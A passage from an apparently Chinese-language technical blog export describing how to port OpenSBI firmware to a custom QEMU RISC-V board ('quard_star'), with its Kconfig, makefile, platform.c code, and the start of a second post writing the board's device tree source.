<li>之后的流程是<code>.bss</code>段的清零和<code>SP</code>指针的初始化。接下来就是调用<code>fw_platform_init</code>函数，注意此时传入参数<code>a0——hart id</code>，<code>a1——fdt</code>地址，a2，a3，a4均为上级loader程序的传入参数，这个函数由platform来实现如果不使用则该函数由弱定义空函数来代替，platform函数具体内容我们后面实现时再来看，此处暂时跳过。</li>
<li>接下来就是<code>_scratch_init</code>函数，<code>scratch</code>你可以认为就是另一个<code>sp</code>指针的东西，定义了一片内存用来存放一些数据，同栈一样，先进后出。<code>_scratch_init</code>其实是按顺序写入了<code>sbi</code>下一级程序的地址参数等信息，由工程内的预定于宏指定，其实这里对我们作用不大，因为<strong>我们使用设备树文件提供给opensbi来解析得到下一级启动地址等信息</strong>。</li>
<li>在向下就是<code>_fdt_reloc</code>，和代码<code>reloc</code>类似，对<code>fdt</code>进行，我们的设计不会执行到这个，最后来到了<code>_start_warm</code>，此时boot核心将标志释放，其余等待在<code>_wait_for_boot_hart</code>的核心也将要跳转到<code>_start_warm</code>。_<code>start_warm</code>针对每一个核心复位寄存器建立自己的栈空间，配置<code>trap</code>异常等完成后调用<code>sbi_init</code>离开汇编代码的世界。</li>
</ol>
<p><img src="/2024/06/06/riscv-4-opensbi/image-20240606210704400.png" alt="image-20240606210704400"></p>
<h1 id="3-Opensbi的移植"><a href="#3-Opensbi的移植" class="headerlink" title="3.Opensbi的移植"></a>3.Opensbi的移植</h1><p>需要明确的：</p>
<ul>
<li>采用<code>opensbi</code>的固件是<code>FW_JUMP</code>，会被加载到<code>DRAM0x80000000</code> 处执行</li>
<li>需要编写设备树编译将设备树的地址传递给<code>Opensbi</code>，<code>rom</code>上的<code>fw_dynamic_info</code>用不到</li>
<li>需要编写在<code>flash</code>上运行代码将<code>opensbi</code>的固件加载到<code>DRAM</code>处 然后跳转执行</li>
</ul>
<p>使用<code>tree -d -L 2</code> 查看源码目录的层次</p>
<p><img src="/2024/06/06/riscv-4-opensbi/image-20240606212336666.png" alt="image-20240606212336666"></p>
<p> 要为我们的<code>quard_star</code> 板卡 新增<code>opensbi</code>的支持，如下进行操作：</p>
<ol>
<li>在 platform 文件下新建一个 名为 <code>quard_star</code>  的文件夹</li>
<li>在quard_star文件夹下新增三个文件<code>Kconfig</code>，<code>objects.mk</code>，<code>platform.c</code></li>
<li>在quard_satr文件夹下新增一个文件夹<code>configs</code>，在<code>configs</code>目录下新建一个名为<code>defconfig</code>的文件</li>
</ol>
<p>新增完的目录如下：</p>
<p><img src="/2024/06/06/riscv-4-opensbi/image-20240606213048514.png" alt="image-20240606213048514"></p>
<blockquote>
<p>quard_star&#x2F;Kconfig</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># SPDX-License-Identifier: BSD-2-Clause</span><br><span class="line"></span><br><span class="line">config PLATFORM_QUARD_STAR</span><br><span class="line">	bool</span><br><span class="line">	select FDT  </span><br><span class="line">	select FDT_DOMAIN </span><br><span class="line">	select FDT_PMU</span><br><span class="line">	default y</span><br></pre></td></tr></table></figure>



<blockquote>
<p>quard_star&#x2F;objects.mk</p>
<p>配置固件为 jump 已经jump跳转地址</p>
</blockquote>
<figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># SPDX-License-Identifier: BSD-2-Clause</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Compiler flags</span></span><br><span class="line">platform-cppflags-y =</span><br><span class="line">platform-cflags-y =</span><br><span class="line">platform-asflags-y =</span><br><span class="line">platform-ldflags-y =</span><br><span class="line"></span><br><span class="line"><span class="comment"># Objects to build</span></span><br><span class="line">platform-objs-y += platform.o</span><br><span class="line"></span><br><span class="line"><span class="comment"># Blobs to build</span></span><br><span class="line">FW_JUMP=y</span><br><span class="line">FW_TEXT_START=0x80000000</span><br><span class="line">FW_JUMP_ADDR=0x0</span><br></pre></td></tr></table></figure>



<blockquote>
<p>quard_star&#x2F;configs&#x2F;defconfig</p>
<p>指定配置需要哪些硬件</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">CONFIG_PLATFORM_ALLWINNER_D1=y</span><br><span class="line">CONFIG_PLATFORM_ANDES_AE350=y</span><br><span class="line">CONFIG_PLATFORM_RENESAS_RZFIVE=y</span><br><span class="line">CONFIG_PLATFORM_SIFIVE_FU540=y</span><br><span class="line">CONFIG_PLATFORM_SIFIVE_FU740=y</span><br><span class="line">CONFIG_FDT_GPIO=y</span><br><span class="line">CONFIG_FDT_GPIO_SIFIVE=y</span><br><span class="line">CONFIG_FDT_I2C=y</span><br><span class="line">CONFIG_FDT_I2C_SIFIVE=y</span><br><span class="line">CONFIG_FDT_IPI=y</span><br><span class="line">CONFIG_FDT_IPI_MSWI=y</span><br><span class="line">CONFIG_FDT_IPI_PLICSW=y</span><br><span class="line">CONFIG_FDT_IRQCHIP=y</span><br><span class="line">CONFIG_FDT_IRQCHIP_APLIC=y</span><br><span class="line">CONFIG_FDT_IRQCHIP_IMSIC=y</span><br><span class="line">CONFIG_FDT_IRQCHIP_PLIC=y</span><br><span class="line">CONFIG_FDT_RESET=y</span><br><span class="line">CONFIG_FDT_RESET_ATCWDT200=y</span><br><span class="line">CONFIG_FDT_RESET_GPIO=y</span><br><span class="line">CONFIG_FDT_RESET_HTIF=y</span><br><span class="line">CONFIG_FDT_RESET_SIFIVE_TEST=y</span><br><span class="line">CONFIG_FDT_RESET_SUNXI_WDT=y</span><br><span class="line">CONFIG_FDT_RESET_THEAD=y</span><br><span class="line">CONFIG_FDT_SERIAL=y</span><br><span class="line">CONFIG_FDT_SERIAL_CADENCE=y</span><br><span class="line">CONFIG_FDT_SERIAL_GAISLER=y</span><br><span class="line">CONFIG_FDT_SERIAL_HTIF=y</span><br><span class="line">CONFIG_FDT_SERIAL_RENESAS_SCIF=y</span><br><span class="line">CONFIG_FDT_SERIAL_SHAKTI=y</span><br><span class="line">CONFIG_FDT_SERIAL_SIFIVE=y</span><br><span class="line">CONFIG_FDT_SERIAL_LITEX=y</span><br><span class="line">CONFIG_FDT_SERIAL_UART8250=y</span><br><span class="line">CONFIG_FDT_SERIAL_XILINX_UARTLITE=y</span><br><span class="line">CONFIG_FDT_TIMER=y</span><br><span class="line">CONFIG_FDT_TIMER_MTIMER=y</span><br><span class="line">CONFIG_FDT_TIMER_PLMT=y</span><br><span class="line">CONFIG_SERIAL_SEMIHOSTING=y</span><br></pre></td></tr></table></figure>



<blockquote>
<p>quard_star&#x2F;platform.c</p>
<p>设备树的理解：<a href="https://zhuanlan.zhihu.com/p/644652123">【Linux内核|驱动模型】设备树的展开unflatten_device_tree - 知乎 (zhihu.com)</a></p>
<p><code>fw_platform_init</code> 函数，注意此时传入参数<code>a0——hart id</code>，<code>a1——fdt</code>地址，a2，a3，a4均为上级loader程序的传入参数。</p>
</blockquote>
<p>函数逻辑：</p>
<ol>
<li>首先，通过解析设备树来获取平台的模型名称（”model” 属性），并将其存储在 <code>platform.name</code> 变量中。</li>
<li>接下来，在设备树的 “&#x2F;<code>cpus</code>” 路径下遍历处理器节点，获取每个处理器的 <code>hartid</code>（处理器标识符）。</li>
<li>根据获取的 <code>hartid</code>，将其存储在 <code>quard_star_hart_index2id</code> 数组中，并增加 <code>hart_count</code> 变量的计数。</li>
<li>最后，设置 <code>platform.hart_count</code> 变量为 <code>hart_count</code>，表示平台上处理器的数量。</li>
<li>函数返回 arg1，即原始的设备树指针。</li>
</ol>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="title function_">fw_platform_init</span><span class="params">(<span class="type">unsigned</span> <span class="type">long</span> arg0, <span class="type">unsigned</span> <span class="type">long</span> arg1,</span></span><br><span class="line"><span class="params">				<span class="type">unsigned</span> <span class="type">long</span> arg2, <span class="type">unsigned</span> <span class="type">long</span> arg3,</span></span><br><span class="line"><span class="params">				<span class="type">unsigned</span> <span class="type">long</span> arg4)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">const</span> <span class="type">char</span> *model;</span><br><span class="line">	<span class="type">void</span> *fdt = (<span class="type">void</span> *)arg1;</span><br><span class="line">	u32 hartid, hart_count = <span class="number">0</span>;</span><br><span class="line">	<span class="type">int</span> rc, root_offset, cpus_offset, cpu_offset, len;</span><br><span class="line"></span><br><span class="line">	root_offset = fdt_path_offset(fdt, <span class="string">&quot;/&quot;</span>);</span><br><span class="line">	<span class="keyword">if</span> (root_offset &lt; <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">goto</span> fail;</span><br><span class="line">	<span class="comment">// 获取平台模型名称</span></span><br><span class="line">	model = fdt_getprop(fdt, root_offset, <span class="string">&quot;model&quot;</span>, &amp;len);</span><br><span class="line">	<span class="keyword">if</span> (model)</span><br><span class="line">		sbi_strncpy(platform.name, model, <span class="keyword">sizeof</span>(platform.name));</span><br><span class="line"></span><br><span class="line">	cpus_offset = fdt_path_offset(fdt, <span class="string">&quot;/cpus&quot;</span>);</span><br><span class="line">	<span class="keyword">if</span> (cpus_offset &lt; <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">goto</span> fail;</span><br><span class="line"></span><br><span class="line">	fdt_for_each_subnode(cpu_offset, fdt, cpus_offset) &#123;</span><br><span class="line">		rc = fdt_parse_hart_id(fdt, cpu_offset, &amp;hartid);</span><br><span class="line">		<span class="keyword">if</span> (rc)</span><br><span class="line">			<span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (SBI_HARTMASK_MAX_BITS &lt;= hartid)</span><br><span class="line">			<span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">		quard_star_hart_index2id[hart_count++] = hartid;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	platform.hart_count = hart_count;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Return original FDT pointer */</span></span><br><span class="line">	<span class="keyword">return</span> arg1;</span><br><span class="line"></span><br><span class="line">fail:</span><br><span class="line">	<span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">		wfi();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<blockquote>
<p>platform_ops 结构体 其结构体类型为<code>const struct sbi_platform_operations</code>，用于指定平台的相关的操作函数</p>
<p>每个成员对应一个平台相关的操作函数，<strong>用于在opensbi初始化过程中进行特定的操作和配置，每个函数在相应的阶段被调用，以完成平台相关的初始化，配置和资源管理等工作</strong></p>
<p>拓展：</p>
<p><code>.early_init</code> 使用点号（<code>.</code>）在结构体初始化时指定成员变量的名称是一种称为“<strong>指定初始化器”（Designated Initializers）的语法</strong>。<strong>这种语法允许你在初始化结构体时明确地指出要初始化的成员变量，从而提高代码的可读性和可维护性。</strong></p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">sbi_platform_operations</span> <span class="title">platform_ops</span> =</span> &#123;</span><br><span class="line">	.early_init		= quard_star_early_init,             	<span class="comment">//早期初始化，不需要</span></span><br><span class="line">	.final_init		= quard_star_final_init,            	<span class="comment">//最终初始化，需要</span></span><br><span class="line">	.early_exit		= quard_star_early_exit,            	<span class="comment">//早期退出，不需要</span></span><br><span class="line">	.final_exit		= quard_star_final_exit,            	<span class="comment">//最终退出，不需要</span></span><br><span class="line">	.domains_init	= quard_star_domains_init,      		<span class="comment">//从设备树填充域，需要</span></span><br><span class="line">	.console_init	= fdt_serial_init,              		<span class="comment">//初始化控制台</span></span><br><span class="line">	.irqchip_init	= fdt_irqchip_init,             		<span class="comment">//初始化中断</span></span><br><span class="line">	.irqchip_exit	= fdt_irqchip_exit,             		<span class="comment">//中断退出</span></span><br><span class="line">	.ipi_init		= fdt_ipi_init,                     	<span class="comment">//中断通信</span></span><br><span class="line">	.ipi_exit		= fdt_ipi_exit,</span><br><span class="line">	.pmu_init		= quard_star_pmu_init,              	<span class="comment">//电源配置</span></span><br><span class="line">	.pmu_xlate_to_mhpmevent = quard_star_pmu_xlate_to_mhpmevent,</span><br><span class="line">	.get_tlbr_flush_limit	= quard_star_tlbr_flush_limit, 	<span class="comment">//需要</span></span><br><span class="line">	.timer_init		= fdt_timer_init,					</span><br><span class="line">	.timer_exit		= fdt_timer_exit,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>



<p>每个函数的定义如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">quard_star_early_init</span><span class="params">(<span class="type">bool</span> cold_boot)</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">quard_star_final_init</span><span class="params">(<span class="type">bool</span> cold_boot)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">void</span> *fdt;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (cold_boot)</span><br><span class="line">		fdt_reset_init();</span><br><span class="line">	<span class="keyword">if</span> (!cold_boot)</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	fdt = sbi_scratch_thishart_arg1_ptr();</span><br><span class="line"></span><br><span class="line">	fdt_cpu_fixup(fdt);</span><br><span class="line">	fdt_fixups(fdt);</span><br><span class="line">	fdt_domain_fixup(fdt);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">quard_star_early_exit</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">quard_star_final_exit</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">quard_star_domains_init</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">return</span> fdt_domains_populate(fdt_get_address());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">quard_star_pmu_init</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">return</span> fdt_pmu_setup(fdt_get_address());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">uint64_t</span> <span class="title function_">quard_star_pmu_xlate_to_mhpmevent</span><span class="params">(<span class="type">uint32_t</span> event_idx,</span></span><br><span class="line"><span class="params">					       <span class="type">uint64_t</span> data)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">uint64_t</span> evt_val = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* data is valid only for raw events and is equal to event selector */</span></span><br><span class="line">	<span class="keyword">if</span> (event_idx == SBI_PMU_EVENT_RAW_IDX)</span><br><span class="line">		evt_val = data;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="comment">/**</span></span><br><span class="line"><span class="comment">		 * Generic platform follows the SBI specification recommendation</span></span><br><span class="line"><span class="comment">		 * i.e. zero extended event_idx is used as mhpmevent value for</span></span><br><span class="line"><span class="comment">		 * hardware general/cache events if platform does&#x27;t define one.</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		evt_val = fdt_pmu_get_select_value(event_idx);</span><br><span class="line">		<span class="keyword">if</span> (!evt_val)</span><br><span class="line">			evt_val = (<span class="type">uint64_t</span>)event_idx;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> evt_val;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">static</span> u64 <span class="title function_">quard_star_tlbr_flush_limit</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">return</span> SBI_PLATFORM_TLB_RANGE_FLUSH_LIMIT_DEFAULT;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<blockquote>
<p>platform结构体</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sbi_platform</span> <span class="title">platform</span> =</span> &#123;</span><br><span class="line">	.opensbi_version	= OPENSBI_VERSION,                      <span class="comment">// 版本号</span></span><br><span class="line">	.platform_version	= SBI_PLATFORM_VERSION(<span class="number">0x0</span>, <span class="number">0x01</span>),      <span class="comment">// 平台的版本号</span></span><br><span class="line">	.name				= <span class="string">&quot;Quard-Star&quot;</span>,  						<span class="comment">// 平台名称</span></span><br><span class="line">	.features			= SBI_PLATFORM_DEFAULT_FEATURES,		<span class="comment">// 平台默认特征</span></span><br><span class="line">	.hart_count			= SBI_HARTMASK_MAX_BITS,  				<span class="comment">// 平台的处理器（hart，riscv叫做hart）数量</span></span><br><span class="line">	.hart_index2id		= quard_star_hart_index2id,				<span class="comment">// 指向处理器标识符数组的指针，用于索引到唯一的处理器标识符</span></span><br><span class="line">	.hart_stack_size	= SBI_PLATFORM_DEFAULT_HART_STACK_SIZE, <span class="comment">// 指定了每个 hart的默认堆栈大小</span></span><br><span class="line">	.platform_ops_addr	= (<span class="type">unsigned</span> <span class="type">long</span>)&amp;platform_ops			<span class="comment">// 平台操作函数的指针，用于指定平台操作函数的地址</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>



]]></content>
      <categories>
        <category>riscv</category>
      </categories>
      <tags>
        <tag>操作系统</tag>
        <tag>riscv，qemu</tag>
      </tags>
  </entry>
  <entry>
    <title>riscv-5-设备树</title>
    <url>/2024/06/08/riscv-5-%E8%AE%BE%E5%A4%87%E6%A0%91/</url>
    <content><![CDATA[<h1 id="1-设备树介绍"><a href="#1-设备树介绍" class="headerlink" title="1.设备树介绍"></a>1.设备树介绍</h1><blockquote>
<p>参考：</p>
<ol>
<li><a href="https://blog.csdn.net/qq_52479948/article/details/132127885">Linux——设备树_linux 设备树-CSDN博客</a></li>
<li><a href="https://yanglianoo.github.io/2023/06/11/%E8%AE%BE%E5%A4%87%E6%A0%91%E8%AF%A6%E8%A7%A3/">设备树详解 | TimerのBlog (yanglianoo.github.io)</a></li>
</ol>
</blockquote>
<p><strong>设备树：</strong>是一种描述硬件的数据结构，提供一种语言将硬件配置从Linux内核源码中提取出来，使得目标板和设备变成数据驱动的，它们必须基于传递给内核的数据进行初始化。</p>
<p>设备树文件 使用一种<code>”Device Tree Source”（DTS）</code>的语言编写，文件描述了硬件设备的层次结构，寄存器地址，中断线路，DMA通道和其他的相关属性。</p>
<p>设备树文件 经过<code>DTC</code>编译后会生成一种称为”Device Tree Blob”（DTB）的二进制格式。DTB文件在引导过程中由引导加载程序（Bootloader）提供给内核。内核会解析DTB文件，根据其中的描述信息初始化硬件设备，并加载相应的驱动程序。</p>
<p>名词解释：</p>
<ul>
<li><code>DTS</code>device tree source ，.dts文件，是一种ASCII 文本格式的文件，一般一个文件对应一个硬件平台</li>
<li><strong><code>DTC</code>：</strong>device tree complier 编译设备树源码的编译工具，一般情况下需要手动安装这个编译工具 </li>
<li><code>DTB</code>：device tree bin 生成的编译文件</li>
</ul>
<p><img src="/2024/06/08/riscv-5-%E8%AE%BE%E5%A4%87%E6%A0%91/image-20240609150607554.png" alt="image-20240609150607554"></p>
<h1 id="2-编写quard-star的设备树文件"><a href="#2-编写quard-star的设备树文件" class="headerlink" title="2.编写quard_star的设备树文件"></a>2.编写quard_star的设备树文件</h1><p>新建dts文件夹和quard_star_sbi.dts</p>
<blockquote>
<p>dts&#x2F;quard_star_sbi.dts</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#address-cells = &lt;0x2&gt;;</span><br><span class="line">#size-cells = &lt;0x2&gt;;</span><br><span class="line">compatible = &quot;riscv-quard-star&quot;;</span><br><span class="line">model = &quot;riscv-quard-star,qemu&quot;;</span><br><span class="line"></span><br><span class="line">chosen &#123;</span><br><span class="line">	stdout-path = &quot;/soc/uart0@10000000&quot;;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">memory@80000000 &#123;</span><br><span class="line">	device_type = &quot;memory&quot;;</span><br><span class="line">	reg = &lt;0x0 0x80000000 0x0 0x40000000&gt;;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>compatible属性</strong>：属性值类型：字符串,<ul>
<li>compatible是系统用来决定绑定到设备的设备驱动的关键。 compatible属性是用来查找节点的方法之一，另外还可以通过节点名或节点路径查找指定节点。</li>
</ul>
</li>
<li><strong>model属性</strong>：属性值类型：字符串<ul>
<li>model属性用于指定设备的制造商和型号，推荐使用“制造商, 型号”的格式，当然也可以自定义。</li>
</ul>
</li>
<li><strong>reg属性</strong><ul>
<li>reg属性描述设备资源在其父总线定义的地址空间内的地址。通常情况下用于表示一块内存的起始地址（偏移地址）和长度，</li>
</ul>
</li>
<li><strong>chosen子节点</strong>：chosen子节点位于根节点下，<ul>
<li>chosen子节点不代表实际硬件，它主要用于给内核传递参数。 这里设置了uart0</li>
</ul>
</li>
</ul>
<p>总的代码，定义了CPU uart 中断等</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/dts-v1/;</span><br><span class="line"></span><br><span class="line">/ &#123;</span><br><span class="line">	#address-cells = &lt;0x2&gt;;</span><br><span class="line">	#size-cells = &lt;0x2&gt;;</span><br><span class="line">	compatible = &quot;riscv-quard-star&quot;;</span><br><span class="line">	model = &quot;riscv-quard-star,qemu&quot;;</span><br><span class="line"></span><br><span class="line">	chosen &#123;</span><br><span class="line">		stdout-path = &quot;/soc/uart0@10000000&quot;;</span><br><span class="line">	&#125;;</span><br><span class="line"></span><br><span class="line">	memory@80000000 &#123;</span><br><span class="line">		device_type = &quot;memory&quot;;</span><br><span class="line">		reg = &lt;0x0 0x80000000 0x0 0x40000000&gt;;</span><br><span class="line">	&#125;;</span><br><span class="line"></span><br><span class="line">	cpus &#123;</span><br><span class="line">		#address-cells = &lt;0x1&gt;;</span><br><span class="line">		#size-cells = &lt;0x0&gt;;</span><br><span class="line">		timebase-frequency = &lt;0x989680&gt;;</span><br><span class="line"></span><br><span class="line">		cpu0: cpu@0 &#123;</span><br><span class="line">			phandle = &lt;0xf&gt;;</span><br><span class="line">			device_type = &quot;cpu&quot;;</span><br><span class="line">			reg = &lt;0x0&gt;;</span><br><span class="line">			status = &quot;okay&quot;;</span><br><span class="line">			compatible = &quot;riscv&quot;;</span><br><span class="line">			riscv,isa = &quot;rv64imafdcsu&quot;;</span><br><span class="line">			mmu-type = &quot;riscv,sv48&quot;;</span><br><span class="line"></span><br><span class="line">			interrupt-controller &#123;</span><br><span class="line">				#interrupt-cells = &lt;0x1&gt;;</span><br><span class="line">				interrupt-controller;</span><br><span class="line">				compatible = &quot;riscv,cpu-intc&quot;;</span><br><span class="line">				phandle = &lt;0x10&gt;;</span><br><span class="line">			&#125;;</span><br><span class="line">		&#125;;</span><br><span class="line"></span><br><span class="line">		cpu1: cpu@1 &#123;</span><br><span class="line">			phandle = &lt;0xd&gt;;</span><br><span class="line">			device_type = &quot;cpu&quot;;</span><br><span class="line">			reg = &lt;0x1&gt;;</span><br><span class="line">			status = &quot;okay&quot;;</span><br><span class="line">			compatible = &quot;riscv&quot;;</span><br><span class="line">			riscv,isa = &quot;rv64imafdcsu&quot;;</span><br><span class="line">			mmu-type = &quot;riscv,sv48&quot;;</span><br><span class="line"></span><br><span class="line">			interrupt-controller &#123;</span><br><span class="line">				#interrupt-cells = &lt;0x1&gt;;</span><br><span class="line">				interrupt-controller;</span><br><span class="line">				compatible = &quot;riscv,cpu-intc&quot;;</span><br><span class="line">				phandle = &lt;0xe&gt;;</span><br><span class="line">			&#125;;</span><br><span class="line">		&#125;;</span><br><span class="line"></span><br><span class="line">		cpu2: cpu@2 &#123;</span><br><span class="line">			phandle = &lt;0xb&gt;;</span><br><span class="line">			device_type = &quot;cpu&quot;;</span><br><span class="line">			reg = &lt;0x2&gt;;</span><br><span class="line">			status = &quot;okay&quot;;</span><br><span class="line">			compatible = &quot;riscv&quot;;</span><br><span class="line">			riscv,isa = &quot;rv64imafdcsu&quot;;</span><br><span class="line">			mmu-type = &quot;riscv,sv48&quot;;</span><br><span class="line"></span><br><span class="line">			interrupt-controller &#123;</span><br><span class="line">				#interrupt-cells = &lt;0x1&gt;;</span><br><span class="line">				interrupt-controller;</span><br><span class="line">				compatible = &quot;riscv,cpu-intc&quot;;</span><br><span class="line">				phandle = &lt;0xc&gt;;</span><br><span class="line">			&#125;;</span><br><span class="line">		&#125;;</span><br><span class="line"></span><br><span class="line">		cpu3: cpu@3 &#123;</span><br><span class="line">			phandle = &lt;0x9&gt;;</span><br><span class="line">			device_type = &quot;cpu&quot;;</span><br><span class="line">			reg = &lt;0x3&gt;;</span><br><span class="line">			status = &quot;okay&quot;;</span><br><span class="line">			compatible = &quot;riscv&quot;;</span><br><span class="line">			riscv,isa = &quot;rv64imafdcsu&quot;;</span><br><span class="line">			mmu-type = &quot;riscv,sv48&quot;;</span><br><span class="line"></span><br><span class="line">			interrupt-controller &#123;</span><br><span class="line">				#interrupt-cells = &lt;0x1&gt;;</span><br><span class="line">				interrupt-controller;</span><br><span class="line">				compatible = &quot;riscv,cpu-intc&quot;;</span><br><span class="line">				phandle = &lt;0xa&gt;;</span><br><span class="line">			&#125;;</span><br><span class="line">		&#125;;</span><br><span class="line"></span><br><span class="line">		cpu4: cpu@4 &#123;</span><br><span class="line">			phandle = &lt;0x7&gt;;</span><br><span class="line">			device_type = &quot;cpu&quot;;</span><br><span class="line">			reg = &lt;0x4&gt;;</span><br><span class="line">			status = &quot;okay&quot;;</span><br><span class="line">			compatible = &quot;riscv&quot;;</span><br><span class="line">			riscv,isa = &quot;rv64imafdcsu&quot;;</span><br><span class="line">			mmu-type = &quot;riscv,sv48&quot;;</span><br><span class="line"></span><br><span class="line">			interrupt-controller &#123;</span><br><span class="line">				#interrupt-cells = &lt;0x1&gt;;</span><br><span class="line">				interrupt-controller;</span><br><span class="line">				compatible = &quot;riscv,cpu-intc&quot;;</span><br><span class="line">				phandle = &lt;0x8&gt;;</span><br><span class="line">			&#125;;</span><br><span class="line">		&#125;;</span><br><span class="line"></span><br><span class="line">		cpu5: cpu@5 &#123;</span><br><span class="line">			phandle = &lt;0x5&gt;;</span><br><span class="line">			device_type = &quot;cpu&quot;;</span><br><span class="line">			reg = &lt;0x5&gt;;</span><br><span class="line">			status = &quot;okay&quot;;</span><br><span class="line">			compatible = &quot;riscv&quot;;</span><br><span class="line">			riscv,isa = &quot;rv64imafdcsu&quot;;</span><br><span class="line">			mmu-type = &quot;riscv,sv48&quot;;</span><br><span class="line"></span><br><span class="line">			interrupt-controller &#123;</span><br><span class="line">				#interrupt-cells = &lt;0x1&gt;;</span><br><span class="line">				interrupt-controller;</span><br><span class="line">				compatible = &quot;riscv,cpu-intc&quot;;</span><br><span class="line">				phandle = &lt;0x6&gt;;</span><br><span class="line">			&#125;;</span><br><span class="line">		&#125;;</span><br><span class="line"></span><br><span class="line">		cpu6: cpu@6 &#123;</span><br><span class="line">			phandle = &lt;0x3&gt;;</span><br><span class="line">			device_type = &quot;cpu&quot;;</span><br><span class="line">			reg = &lt;0x6&gt;;</span><br><span class="line">			status = &quot;okay&quot;;</span><br><span class="line">			compatible = &quot;riscv&quot;;</span><br><span class="line">			riscv,isa = &quot;rv64imafdcsu&quot;;</span><br><span class="line">			mmu-type = &quot;riscv,sv48&quot;;</span><br><span class="line"></span><br><span class="line">			interrupt-controller &#123;</span><br><span class="line">				#interrupt-cells = &lt;0x1&gt;;</span><br><span class="line">				interrupt-controller;</span><br><span class="line">				compatible = &quot;riscv,cpu-intc&quot;;</span><br><span class="line">				phandle = &lt;0x4&gt;;</span><br><span class="line">			&#125;;</span><br><span class="line">		&#125;;</span><br><span class="line"></span><br><span class="line">		cpu7: cpu@7 &#123;</span><br><span class="line">			phandle = &lt;0x1&gt;;</span><br><span class="line">			device_type = &quot;cpu&quot;;</span><br><span class="line">			reg = &lt;0x7&gt;;</span><br><span class="line">			status = &quot;okay&quot;;</span><br><span class="line">			compatible = &quot;riscv&quot;;</span><br><span class="line">			riscv,isa = &quot;rv64imafdcsu&quot;;</span><br><span class="line">			mmu-type = &quot;riscv,sv48&quot;;</span><br><span class="line"></span><br><span class="line">			interrupt-controller &#123;</span><br><span class="line">				#interrupt-cells = &lt;0x1&gt;;</span><br><span class="line">				interrupt-controller;</span><br><span class="line">				compatible = &quot;riscv,cpu-intc&quot;;</span><br><span class="line">				phandle = &lt;0x2&gt;;</span><br><span class="line">			&#125;;</span><br><span class="line">		&#125;;</span><br><span class="line"></span><br><span class="line">		cpu-map &#123;</span><br><span class="line"></span><br><span class="line">			cluster0 &#123;</span><br><span class="line"></span><br><span class="line">				core0 &#123;</span><br><span class="line">					cpu = &lt;0xf&gt;;</span><br><span class="line">				&#125;;</span><br><span class="line"></span><br><span class="line">				core1 &#123;</span><br><span class="line">					cpu = &lt;0xd&gt;;</span><br><span class="line">				&#125;;</span><br><span class="line"></span><br><span class="line">				core2 &#123;</span><br><span class="line">					cpu = &lt;0xb&gt;;</span><br><span class="line">				&#125;;</span><br><span class="line"></span><br><span class="line">				core3 &#123;</span><br><span class="line">					cpu = &lt;0x9&gt;;</span><br><span 